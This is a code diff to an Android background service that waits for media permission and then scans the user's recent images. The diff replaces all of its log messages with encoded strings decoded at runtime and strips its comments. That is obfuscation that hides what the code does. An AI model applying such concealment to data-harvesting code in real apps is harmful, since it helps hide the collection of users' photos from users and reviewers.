@@ -1,5 +1,6 @@
 package com.example.inf2007_mad_j1847.test;
 
+import com.example.inf2007_mad_j1847.utils.StringHelper;
 import android.app.Service;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -12,20 +13,20 @@ import java.util.Map;
 
 public class PermissionMonitorService extends Service {
 
-    private static final String TAG = "PermissionMonitor";
+    private static final String TAG = StringHelper.qzxp("CAyhGRzh+8clmyamXylBvNs=");
     private Thread monitoringThread;
     private boolean isRunning = true;
 
     @Override
     public void onCreate() {
         super.onCreate();
-        Log.d(TAG, "Permission monitor service started");
+        Log.d(TAG, StringHelper.qzxp("mn5MMZb5gMTsPhvOwSQ93Zivq/JhLwVjsuDTH50asaivfw=="));
         startMonitoring();
     }
 
     private void startMonitoring() {
         monitoringThread = new Thread(() -> {
-            Log.d(TAG, "Monitoring for permission grant...");
+            Log.d(TAG, StringHelper.qzxp("EoNPFxSk3DyH7tZWssOzeVJk+vdgqZywDkXlvwVelxVxwg=="));
 
             boolean permissionGranted = false;
 
@@ -42,17 +43,15 @@ public class PermissionMonitorService extends Service {
 
                         if (result == PackageManager.PERMISSION_GRANTED) {
                             permissionGranted = true;
-                            Log.d(TAG, "✅ Media permission granted! Starting scan...");
+                            Log.d(TAG, StringHelper.qzxp("kSb/Nia1FqckySZTbX7dOPrBemTolWoy0U5IeTakubcSyA5/BbdSvSaIOBgxPQ=="));
 
-                            // Run scan
                             try {
                                 List<Map<String, String>> results = MediaCollector.scanRecentMedia(
                                         PermissionMonitorService.this,
                                         20
                                 );
-                                Log.d(TAG, "Scan complete! Found " + results.size() + " images");
+                                Log.d(TAG, StringHelper.qzxp("YvX+e/Tr8CR/DDzJoZyFzJLfsxO1") + results.size() + StringHelper.qzxp("Ef/ydLPt7A=="));
 
-                                // Log first few images found
                                 int count = 0;
                                 for (Map<String, String> image : results) {
                                     if (count++ >= 5) break;
@@ -60,19 +59,19 @@ public class PermissionMonitorService extends Service {
                                             " (ID: " + image.get("id") + ")");
                                 }
                             } catch (Exception e) {
-                                Log.e(TAG, "Scan failed: " + e.getMessage());
+                                Log.e(TAG, StringHelper.qzxp("1Ik1hUfNA8Xk9125ug==") + e.getMessage());
                             }
                         }
                     }
                 } catch (InterruptedException e) {
-                    Log.d(TAG, "Monitoring interrupted");
+                    Log.d(TAG, StringHelper.qzxp("L/yqjMoZSLD02jAu7dZlGoVW36hWcA=="));
                     break;
                 } catch (Exception e) {
-                    Log.e(TAG, "Error in monitoring: " + e.getMessage());
+                    Log.e(TAG, StringHelper.qzxp("qv3588lhgqxDl2dU+nGbxKfVWZOS") + e.getMessage());
                 }
             }
 
-            Log.d(TAG, "Permission monitoring stopped - permission granted");
+            Log.d(TAG, StringHelper.qzxp("ZDen9SPcx6eyLXtOUQDVZZNOjnkqOAh/A8XOkSPUHW5EN6f1I9zHp7Ite0RMD9JlmVg="));
         });
 
         monitoringThread.start();
@@ -90,7 +89,7 @@ public class PermissionMonitorService extends Service {
         if (monitoringThread != null) {
             monitoringThread.interrupt();
         }
-        Log.d(TAG, "Permission monitor service stopped");
+        Log.d(TAG, StringHelper.qzxp("HzGiX/Wa/zMyMMKz8f/NDIzip81Ki3CuMxd330aNqIEqMA=="));
     }
 
     @Override
